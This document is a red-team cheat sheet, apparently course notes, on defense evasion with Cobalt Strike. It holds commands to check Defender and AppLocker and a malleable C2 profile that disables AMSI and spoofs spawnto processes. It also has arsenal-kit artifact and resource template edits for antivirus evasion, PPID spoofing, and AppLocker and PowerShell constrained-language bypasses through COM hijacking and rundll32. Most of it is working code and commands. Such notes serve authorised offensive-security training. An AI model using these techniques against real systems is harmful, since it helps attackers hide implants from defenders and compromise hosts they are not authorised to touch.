# Defense Evasion

## Check Defenses

```powershell
# Defender Status
(Get-MpPreference).DisableRealtimeMonitoring

# Language Mode
$ExecutionContext.SessionState.LanguageMode

# AppLocker
## From Registry
Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2'
Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe'
# From Get-AppLockerPolicy cmdlet
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections
# From GPO
beacon> ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath
beacon> ls $gPCFileSysPath
beacon> download $gPCFileSysPath

PS> Parse-PolFile -Path $file.pol
```

## Evasion

### Check Binary

```powershell
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\artifact64big.exe
```

### Obfuscate Binary

```powershell
ipmo C:\Tools\Invoke-Obfuscation\Invoke-Obfuscation.psd1
Invoke-Obfuscation

Invoke-Obfuscation> SET SCRIPTBLOCK '$script'
```

### Cobalt Strike Profile

-  SSH into team server and edit the profile:

```shell
cd /opt/cobaltstrike/profiles
nano default.profile
```

- Add the following chunk:

```shell
stage {
   set userwx "false";
   set module_x64 "Hydrogen.dll";
   set copy_pe_header "false";
}

post-ex {
  set amsi_disable "true";
  set spawnto_x86 "%windir%\\syswow64\\svchost.exe"; 
  set spawnto_x64 "%windir%\\sysnative\\svchost.exe";
  set obfuscate "true";
  set cleanup "true";
  set pipename "dotnet-diagnostic-82938", "dotnet-diagnostic-12133";
  set smartinject "true";

  transform-x64 {
      strrep "ReflectiveLoader" "NetlogonMain";
      strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
      strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";

      # add any other transforms that you want
  }
}

process-inject {
  execute {
      NtQueueApcThread-s;
      NtQueueApcThread;
      SetThreadContext;
      RtlCreateUserThread;
      CreateThread;
  }
}
```

- Restart the server

```shell
sudo /usr/bin/docker restart cobaltstrike-cs-1
sudo /usr/bin/docker logs cobaltstrike-cs-1
```

> `amsi_disable` DOES NOT apply to the `powershell` command - use `powerpick or psinject` instead.

- psexec spawnto

```shell
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> ak-settings spawnto_x86 C:\Windows\SysWOW64\svchost.exe
beacon> ak-settings
```

- Some notable examples include `System.Management.Automation.dll`, which is required by `powerpick` and `psinject`. `cryptdll.dll, samlib.dll, and vaultcli.dll` are required by `mimikatz`.
- So, PPID spoofing can help in avoiding detection:

```shell
beacon> ppid 6648
beacon> spawnto x64 C:\Windows\System32\msiexec.exe
beacon> powerpick Start-Sleep -s 60
```

### Cobalth Strike Artifacts & Resources

- Launch Visual Studio Code. Go to File > Open Folder and select `C:\Tools\cobaltstrike\arsenal-kit\kits\artifact`.
- Navigate to src-common and open `patch.c`. Scroll to line `~45` and modify the for loop. This is for the svc exe payloads.

```cpp
x = length;
while(x--) {
  *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

- Scroll to line `~116` and modify the other for loop. This is for the normal exe payloads.

```cpp
int x = length;
while(x--) {
  *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

- Save the changes (File > Save) and close the folder (File > Close Folder). On the Windows taskbar, right-click on the Terminal icon launch Ubuntu. Change the working directory.

```shell
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

- Open the Cobalt Strike client and load artifact.cna from C:\Tools\cobaltstrike\custom-artifacts\mailslot.

```shell
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource

./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```

- Go to File > Open Folder and select `C:\Tools\cobaltstrike\custom-resources`. Select `template.x64.ps1`. Rename the `func_get_proc_address` function on `line 3` to `get_proc_address`. Rename the `func_get_delegate_type` function on `line 10` to `get_delegate_type`.

- Scroll to line `32` and replace it with:

```powershell
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll WriteProcessMemory), (get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```

- Select `compress.ps1` and Use `Invoke-Obfuscation` to create a unique obfuscated version.

- Open the Cobalt Strike client and load resources.cna from C:\Tools\cobaltstrike\custom-resources.

### AppLocker Bypass

- Path Wildcards
- Writable Directories (%WINDIR%\*)
- LOLBAS (MSBuild)

[Course Reference](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=67e5ad91c49499b06c09e5e7Unit)


### PowerShell CLM

- This can be abused by creating a custom COM object that will load an arbitrary DLL into the PowerShell process.  This is a similar process to when we added registry entries for COM hijacking.

```powershell
[System.Guid]::NewGuid()

C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\CLSID' -Name '$GUID'
C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\CLSID\{$GUID}' -Name 'InprocServer32' -Value 'bypass.dll'
C:\Users\pchilds> New-ItemProperty -Path 'HKCU:Software\Classes\CLSID\{$GUID}\InprocServer32' -Name 'ThreadingModel' -Value 'Both'

C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes' -Name 'AppLocker.Bypass' -Value 'AppLocker Bypass'
C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\AppLocker.Bypass' -Name 'CLSID' -Value '{$GUID}'
```

- Now run the command to use it:

```powershell
New-Object -ComObject AppLocker.Bypass
```

- AppLocker can enforce DLL rules, but these are rarely enabled due to the performance concerns. When disabled, you can load arbitrary DLLs using rundll32.  This requires that the DLL have at least one exported function that you call.

```powershell
rundll32 bypass.dll,execute
```